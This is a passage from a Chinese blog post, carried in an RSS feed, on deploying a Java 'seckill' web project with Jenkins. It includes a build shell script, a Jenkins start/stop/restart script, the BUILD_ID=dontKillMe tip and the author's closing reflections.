&lt;p&gt;#_RUNJAVA=&quot;$JRE_HOME&quot;/bin/java&lt;br/&gt;    #注释tomcat默认进程名，设置指定的进程名称，集群的时候可以进行编号01,02,03设置&lt;/p&gt;
&lt;p&gt;cp &quot;$JAVA_HOME/bin/java&quot; &quot;$JAVA_HOME/bin/seckill_consumer01&quot;&lt;/p&gt;
&lt;p&gt; _RUNJAVA=&quot;$JRE_HOME/bin/seckill_consumer01&quot;&lt;/p&gt;
&lt;p&gt;fi&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;　　b) Shell脚本尽可能通用&lt;/p&gt;
&lt;p&gt;　　我吸取了现在比较流行的一句话“约定大于配置”及平时所看所想，在编写Shell脚本时可以提取可变或多处使用的变量，使整个Shell脚本尽可能提炼成通用，以便类似项目部署可以使用现有脚本进行更改后使用，减少重新编写新Shell脚本带来不可控的问题。&lt;/p&gt;
&lt;h2&gt;【④使用Jenkins进行代码部署】&lt;/h2&gt;
&lt;p&gt;　　在使用Jenkins进行项目部署时，需要将Jenkins的war包放在服务器的指定位置。Jenkins的war的下载可以去Jenkins的官网进行下载。&lt;/p&gt;
&lt;p&gt;　　使用Jenkins进行代码部署时需要的环境支持：&lt;/p&gt;
&lt;p&gt;　　1、安装Maven并配置环境变量&lt;/p&gt;
&lt;p&gt;　　2、Git客户端，并配置环境变量&lt;/p&gt;
&lt;p&gt;　　3、熟悉Shell脚本相关知识&lt;/p&gt;
&lt;p&gt;　　4、对Jenkins有一定了解&lt;/p&gt;

&lt;p&gt;　　使用Jenkins进行代码部署如下：&lt;/p&gt;
&lt;h4&gt;　　1、 启动Jenkins工具&lt;/h4&gt;
&lt;p&gt;　　在jenkins.war目录执行以下命令操作启动Jenkins工具。&lt;/p&gt;
&lt;p&gt;　　[xiongshx@localhost jenkins]$ java -jar jenkins.war&lt;/p&gt;
&lt;p&gt;   　Jenkins工具初始化的一些操作可以百度或者去Jenkins查看可以参考【https://www.cnblogs.com/cheng95/p/6542036.html】&lt;/p&gt;
&lt;p&gt;　　初始化后需要进行的配置&lt;/p&gt;
&lt;p&gt;　　工具配置&lt;/p&gt;
&lt;p&gt;　　【系统管理】-&amp;gt;【全局工具配置】&lt;/p&gt;
&lt;p&gt;　　 Jdk配置：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809214815455-1057560552.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　Git配置：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809214825486-520957945.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 　　Maven配置：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809214831874-1619888987.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;　　2、 新建任务&lt;/h3&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809214852192-654331040.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　需要注意的点：&lt;/p&gt;
&lt;p&gt;　　1、填写源码仓库地址&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809214934064-1191111479.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;  　 2、构建时操作及自定义shell代码&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809214956807-517767332.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Shell代码如下：&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tbody readability=&quot;3&quot;&gt;&lt;tr readability=&quot;36&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;553&quot; readability=&quot;63&quot;&gt;
&lt;p&gt;#!/bin/bash&lt;/p&gt;
&lt;p&gt;#shell功能概要:seckill的Web消费者构建shell&lt;/p&gt;
&lt;p&gt;#引用的技术有：git、maven&lt;/p&gt;
&lt;p&gt;#发布web消费者的服务器的进程名&lt;/p&gt;
&lt;p&gt;serverName=&quot;seckill_consumer&quot;&lt;/p&gt;
&lt;p&gt;#获取发布web消费者的服务器的进程PID&lt;/p&gt;
&lt;p&gt;PID=$(ps -ef | grep $serverName | grep -v grep | awk '{ print $2 }')&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;#需要在脚本开始时添加export BUILD_ID=dontKillMe。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;#原因：因为Jenkins执行完当前任务之后需要执行下一个任务,此时Jenkins会直接把tomcat进程杀掉，&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;#因此在脚本中编写的tomcat启动命令是不会执行的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;export BUILD_ID=dontKillMe&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;#java代码本地仓库地址&lt;/p&gt;
&lt;p&gt;javaBaseSrc=&quot;/home/xiongshx/.jenkins/workspace/&quot;&lt;/p&gt;
&lt;p&gt;#项目路径&lt;/p&gt;
&lt;p&gt;javaProjectSrc=&quot;seckill/seckill-web/target/seckill-web.war&quot;&lt;/p&gt;
&lt;p&gt;#发布的tomcat&lt;/p&gt;
&lt;p&gt;projectServicersPath=(/opt/seckill-tomcat/seckill-tomcat-01)&lt;/p&gt;
&lt;p&gt;projectName=&quot;sekill&quot;&lt;/p&gt;
&lt;p&gt;for var in ${PID};&lt;/p&gt;
&lt;p&gt;do&lt;/p&gt;
&lt;p&gt;  echo &quot;准备强制停止PID:$var&quot;&lt;/p&gt;
&lt;p&gt;  kill -9 $var&lt;/p&gt;
&lt;p&gt;done&lt;/p&gt;
&lt;p&gt;echo &quot;kill $serverName sucess&quot;&lt;/p&gt;
&lt;p&gt;#如果上一个命令执行失败，执行的状态码不为0&lt;/p&gt;
&lt;p&gt;if [ $? -ne 0 ]&lt;/p&gt;
&lt;p&gt;then&lt;/p&gt;
&lt;p&gt;  echo &quot;构建失败，请查看代码问题！&quot;&lt;/p&gt;
&lt;p&gt;  exit 1;&lt;/p&gt;
&lt;p&gt;fi&lt;/p&gt;
&lt;p&gt;for projectServicer in ${projectServicersPath[@]}&lt;/p&gt;
&lt;p&gt;do&lt;/p&gt;
&lt;p&gt;           cp $javaBaseSrc$javaProjectSrc $projectServicer/webapps&lt;/p&gt;
&lt;p&gt;           echo &quot;$projectServicer 代码发布成功!&quot;&lt;/p&gt;
&lt;p&gt;           /bin/bash $projectServicer/bin/startup.sh&lt;/p&gt;
&lt;p&gt;           if [ $? -ne 0 ]&lt;/p&gt;
&lt;p&gt;           then&lt;/p&gt;
&lt;p&gt;             echo &quot;$projectServicer 启动失败&quot;&lt;/p&gt;
&lt;p&gt;             exit 1;&lt;/p&gt;
&lt;p&gt;           else&lt;/p&gt;
&lt;p&gt;             echo &quot;$projectServicer 启动成功&quot;;&lt;/p&gt;
&lt;p&gt;           fi&lt;/p&gt;
&lt;p&gt;done&lt;/p&gt;
&lt;p&gt;echo &quot;启动 $serverName 成功&quot;&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h4&gt;　　3、 启动项目&lt;/h4&gt;
&lt;p&gt;  【立即构建】-&amp;gt;【点击构建的链接】-&amp;gt;【控制台输出】即可查看整个代码部署过程中的信息输出。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809215059034-940269941.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1114800/201808/1114800-20180809215104175-583363226.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span&gt;　4、需要注意的问题点：&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;　　 1、Jenkins的war问题&lt;/p&gt;
&lt;p&gt;   　最简单jenkins.war的启动方式是在控制台终端执行命令：java -jar jenkins.war；但是此方法会占用一个终端窗口，且关闭后Jenkins工具就不能进行访问，可以使用命令进行后台执行，命令如下：&lt;/p&gt;
&lt;p&gt;　　nohup java -jar jenkins.war --httpPort=9090 &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　命令解释&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　&lt;span&gt;nohup 后台执行操作&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　--httpPort=9090表示指定占用9090端口进行访问&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　&amp;gt; /dev/null 将日志输出到/dev/null&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;　　2&amp;gt;&amp;amp;1 &amp;amp; 用来将标准错误2重定向到标准输出1中的此处1前面的&amp;amp;就是为了让bash将1解释成标准输出而不是文件1。最后一个&amp;amp;，则是让bash在后台执行&lt;/strong&gt;&lt;/span&gt;。&lt;/p&gt;

&lt;p&gt;　　另外一种更优雅的方式是使用Shell脚本控制Jenkins工具的启动、停止、重启等操作。&lt;/p&gt;
&lt;p&gt;　　样例如下：&lt;/p&gt;
&lt;table border=&quot;1&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&lt;tbody readability=&quot;2.5&quot;&gt;&lt;tr readability=&quot;25.5&quot;&gt;&lt;td valign=&quot;top&quot; width=&quot;553&quot; readability=&quot;44&quot;&gt;
&lt;p&gt;#!/bin/bash&lt;/p&gt;
&lt;p&gt;#功能描述：用于Jenkins运行，停止，重启&lt;/p&gt;
&lt;p&gt;#将此脚本放在jenkins.war同级目录&lt;/p&gt;

&lt;p&gt;#获取Jenkins的进程id&lt;/p&gt;
&lt;p&gt;pid=$(ps -ef| grep &quot;jenkins.war&quot; | grep -v grep | awk '{print $2}')&lt;/p&gt;
&lt;p&gt;#jenkins默认端口号&lt;/p&gt;
&lt;p&gt;jekinsDefaultPort=9090&lt;/p&gt;
&lt;p&gt;#如果用户有自定义端口号，则使用用户自定义的端口号启动jenkins&lt;/p&gt;
&lt;p&gt;if [ x$2 != x ]&lt;/p&gt;
&lt;p&gt;then&lt;/p&gt;
&lt;p&gt;   jekinsDefaultPort=$2&lt;/p&gt;
&lt;p&gt;fi&lt;/p&gt;

&lt;p&gt;#启动jenkins&lt;/p&gt;
&lt;p&gt;start(){&lt;/p&gt;
&lt;p&gt;       if [ x$pid != x ]&lt;/p&gt;
&lt;p&gt;    then&lt;/p&gt;
&lt;p&gt;              echo &quot;jenkins已经是启动状态...&quot;&lt;/p&gt;
&lt;p&gt;              exit 1&lt;/p&gt;
&lt;p&gt;       fi&lt;/p&gt;
&lt;p&gt;       nohup java -jar jenkins.war --httpPort=$jekinsDefaultPort &amp;gt; /dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;/p&gt;
&lt;p&gt;       echo &quot;jenkins启动成功，端口号为：$jekinsDefaultPort...&quot;&lt;/p&gt;
&lt;p&gt;       return $?&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;

&lt;p&gt;stop(){&lt;/p&gt;
&lt;p&gt;       echo &quot;准备停止jenkins...&quot;&lt;/p&gt;
&lt;p&gt;       if [ x$pid != x ]&lt;/p&gt;
&lt;p&gt;        then&lt;/p&gt;
&lt;p&gt;           kill -9 $pid&lt;/p&gt;
&lt;p&gt;           echo &quot;jenkins已经停止...&quot;&lt;/p&gt;
&lt;p&gt;           exit $?&lt;/p&gt;
&lt;p&gt;       else&lt;/p&gt;
&lt;p&gt;           echo &quot;jenkins的进程id不存在，无法进行停止操作...&quot;&lt;/p&gt;
&lt;p&gt;           exit 1&lt;/p&gt;
&lt;p&gt;       fi    &lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;

&lt;p&gt;# 重新加载Jenkins&lt;/p&gt;
&lt;p&gt;restart() {&lt;/p&gt;
&lt;p&gt;    stop&lt;/p&gt;
&lt;p&gt;    start&lt;/p&gt;
&lt;p&gt;    echo &quot;jenkins重新加载成功，jekins端口号为：$jekinsDefaultPort...&quot;&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;

&lt;p&gt;case &quot;$1&quot; in&lt;/p&gt;
&lt;p&gt;start)&lt;/p&gt;
&lt;p&gt;        start&lt;/p&gt;
&lt;p&gt;        ;;&lt;/p&gt;
&lt;p&gt;stop)&lt;/p&gt;
&lt;p&gt;        stop&lt;/p&gt;
&lt;p&gt;        ;;&lt;/p&gt;
&lt;p&gt;restart)&lt;/p&gt;
&lt;p&gt;        stop&lt;/p&gt;
&lt;p&gt;        start&lt;/p&gt;
&lt;p&gt;        ;;&lt;/p&gt;
&lt;p&gt;*)&lt;/p&gt;
&lt;p&gt;        echo $&quot;提示: 请在jenkins后输入以下参数:{start|stop|restart} 端口号（不填写时默认端口9090）&quot;&lt;/p&gt;
&lt;p&gt;        exit 1&lt;/p&gt;
&lt;p&gt;esac&lt;/p&gt;
&lt;p&gt;exit $?&lt;/p&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;　　2、Jenkins中自定义Shell问题&lt;/p&gt;
&lt;p&gt;  　　&lt;strong&gt;#&lt;/strong&gt;&lt;strong&gt;需要在脚本开始时添加export BUILD_ID=dontKillMe。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　  #原因：因为Jenkins执行完当前任务之后需要执行下一个任务,此时Jenkins会直接把tomcat进程杀掉，#因此在脚本中编写的tomcat启动命令是不会执行的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;　　  export BUILD_ID=dontKillMe&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;【⑤课程总结及心得】&lt;/h2&gt;
&lt;p&gt;　　学习代码自动部署的缘由一来是由于在平时开发过程中经常会遇到代码部署的环节，希望通过学习此知识后，如果后续有机会针对自己学会的方案进行评估后简化项目中的项目部署，二来是巩固自己近期来学习到的一些知识，通过层层迭进来学习代码的自动部署方案。虽然目前自己的这些流程方案可能还有所欠缺，且还没有经过实际项目考验，但能学到很多实际的知识也足够了，比如Maven相关知识、Shell相关知识以及Jenkins相关知识，这些是只能通过自己动手慢慢去实践才能获取到的经验。如果对代码部署也感兴趣且觉得我写的东西对你有帮助的同行们，我建议可以按照我的学习步骤去学习自动构建技术。&lt;/p&gt;
&lt;p&gt;　　此系列文章可能写的还不够好，并且很多地方我都进行了一些精简。其实我希望给大家提供的是一个思路。比如学习整个项目部署的思路，由Maven插件部署到Shell脚本部署再到Jenkins部署项目，其实越到后面，Jenkins只是对一些操作做了集成封装，但是我觉得如果我们能从最基本做起，了解其中的流程及原理，真正使用Jenkins进行代码部署时，我们能知道所以然，那样我觉得可以更好的使用Jenkins工具。另外，比如Jenkins.war的启动，我很自然的想到使用Shell脚本将它的启动、运行、重启等命令进行封装，并把它设置为开机启动，我觉得这是一个优雅的方式，以后有类似的情况时，我也会考虑这么做。&lt;/p&gt;
&lt;p&gt;　　本文中还有一些没有提及和没有实现的内容，我希望以及对此技术感兴趣的同行们，都可以发散思维，把事情尽善尽美，做到最优做好。通过编写此系列文章，我巩固了我此类技术的知识的了解以及拓展，也希望能够帮助到大家。如果大家在学习此类技术上遇到疑惑或问题，可以百度查看解决办法，也可以给我留言进行探讨。&lt;/p&gt;
&lt;p&gt;最后，希望所有人在不久的将来都能遇到一个优秀的自己。&lt;/p&gt;

</description>
<pubDate>Thu, 09 Aug 2018 14:05:00 +0000</pubDate>
<dc:creator>it小熊</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiongshx/p/9450680.html</dc:identifier>
</item>
</channel>
</rss>